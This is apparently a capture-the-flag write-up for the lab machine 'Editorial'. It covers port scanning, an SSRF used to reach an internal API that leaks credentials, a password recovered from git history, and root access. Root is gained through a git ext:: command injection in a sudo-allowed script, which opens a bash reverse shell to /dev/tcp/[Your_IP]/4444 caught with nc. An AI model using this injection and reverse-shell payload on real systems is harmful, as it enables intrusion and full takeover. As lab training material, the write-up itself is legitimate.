# Editorial - Ashbo3n

**Machine Name:** Editorial

**Rating:** 4.3

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">**Clear Text Credentials,** </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">**Server Side Request Forgery** (SSRF), </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Misconfiguration</span>

## <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Initial Shell - SSRF And Clear Text Creds</span>

<span class="chip__text htb-body-md htb-text-primary htb-font-medium">Nmap:</span>

```bash
# Nmap 7.95 scan initiated Wed Jan 14 00:26:20 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.36.229
Increasing send delay for 10.129.36.229 from 0 to 5 due to 342 out of 1139 dropped probes since last increase.
Increasing send delay for 10.129.36.229 from 5 to 10 due to 398 out of 1325 dropped probes since last increase.
Increasing send delay for 10.129.36.229 from 20 to 40 due to 516 out of 1718 dropped probes since last increase.
Nmap scan report for 10.129.36.229
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2026-01-14 00:26:21 IST for 36s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 00:26:57 2026 -- 1 IP address (1 host up) scanned in 37.68 seconds

```

Ignoring 22 and moving forward to port 80, before that notice port 80 is redirecting us to [http://editorial.htb/](http://editorial.htb/) and since there is no DNS we have to manually add it to our /etc/hosts, after adding it, start fuzzing for VHOSTs, Subdomains, and Directories.

**Subdomains, VHOSTs AND DIR Fuzzing**

```bash
┌──(root㉿kali)-[~/HTB/Editorial]
└─# ffuf -c -u http://editorial.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editorial.htb/FUZZ
 :: Wordlist         : FUZZ: /root/wordlist/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 237ms]
upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 246ms]
about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 736ms]
upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 235ms]

```

A Interesting Directory would is `/upload`, In background ffuf is fuzzing for VHOSTS Shoot up burp and turn on intercept and start a python server on your terminal and then back to website put the URL to your machine in Book information and click preview and we can see it is a SSRF, now we would be able to scan internal ports, lets do that:

**Internal Port Scanning**

After intercepting the request to our attacker machine in burp, in the request change bookurl to `http://127.0.0.1:FUZZ` and save it, After saving it your file should look something like this:

```bash
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------138549749433693524942503897526
Content-Length: 367
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload
X-PwnFox-Color: blue
Priority: u=0

-----------------------------138549749433693524942503897526
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------138549749433693524942503897526
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------138549749433693524942503897526--
```

 we can fuzz for internal ports via ffuf, with this command: `ffuf -c -request Request.req -request-proto http -w ~/wordlist/ports.txt -t 60` and we found port 5000 open:

```bash
┌──(root㉿kali)-[~/HTB/Editorial]
└─# ffuf -c -request Request.req -request-proto http -w ~/wordlist/ports.txt -t 60 -fs 61 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /root/wordlist/ports.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------138549749433693524942503897526
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : X-PwnFox-Color: blue
 :: Header           : Priority: u=0
 :: Header           : Host: editorial.htb
 :: Header           : Accept: */*
 :: Header           : Origin: http://editorial.htb
 :: Data             : -----------------------------138549749433693524942503897526
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------138549749433693524942503897526
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------138549749433693524942503897526--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 229ms]

```

Going to 5000 it returned: `static/uploads/3342ae93-7fd0-4232-9a60-22037f57de3f` and going to `static/uploads/3342ae93-7fd0-4232-9a60-22037f57de3f` downloaded a file, let's open it.

```json
┌──(root㉿kali)-[~/HTB/Editorial]
└─# cat artifact            
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/HTB/Editorial]
└─# 
```

Now going to `/api/latest/metadata/messages/authors` returned `static/uploads/8514c1de-af36-4a9d-8413-344f85e8b48a` and going this endpoint returned:

```
┌──(root㉿kali)-[~/HTB/Editorial]
└─# curl http://editorial.htb/static/uploads/8514c1de-af36-4a9d-8413-344f85e8b48a
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: Redacted\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
   
```

Let's ssh in.

```bash
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cat user.txt
Redacted!
dev@editorial:~$ cd apps
dev@editorial:~/apps$ ls
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
dev@editorial:~/apps$ cd .git
dev@editorial:~/apps/.git$ ls -la
total 56
drwxr-xr-x  8 dev dev 4096 Jun  5  2024 .
drwxrwxr-x  3 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 branches
-rw-r--r--  1 dev dev  253 Jun  4  2024 COMMIT_EDITMSG
-rw-r--r--  1 dev dev  177 Jun  4  2024 config
-rw-r--r--  1 dev dev   73 Jun  4  2024 description
-rw-r--r--  1 dev dev   23 Jun  4  2024 HEAD
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 hooks
-rw-r--r--  1 dev dev 6163 Jun  4  2024 index
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 info
drwxr-xr-x  3 dev dev 4096 Jun  5  2024 logs
drwxr-xr-x 70 dev dev 4096 Jun  5  2024 objects
drwxr-xr-x  4 dev dev 4096 Jun  5  2024 refs
dev@editorial:~/apps/.git$ 

```

Got the user flag, moving to root.

## Root Shell - Sudo Misconfiguration

Do git log -GProd, 1 commit seems interesting, let's view that one:

```bash
dev@editorial:~/apps/.git$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: Redacted\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
dev@editorial:~/apps/.git$ 
```

Switch to user Prod

Doing sudo -l we can see we can run a file as root:

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
prod@editorial:/opt/internal_apps/clone_changes$ 
```

with this command we can become root:

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/[Your_IP]/4444% 0>&1'"
```

and start a nc listener on port 4444 and you will get the shell as root:

```
┌──(root㉿kali)-[~/HTB/Editorial]
└─# nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.10.15.197] from (UNKNOWN) [10.129.36.229] 43840
root@editorial:/opt/internal_apps/clone_changes# cd ~/root
cd ~/root
bash: cd: /root/root: No such file or directory
root@editorial:/opt/internal_apps/clone_changes# cat /root/root.txt
cat /root/root.txt
Redacted!
root@editorial:/opt/internal_apps/clone_changes# 


```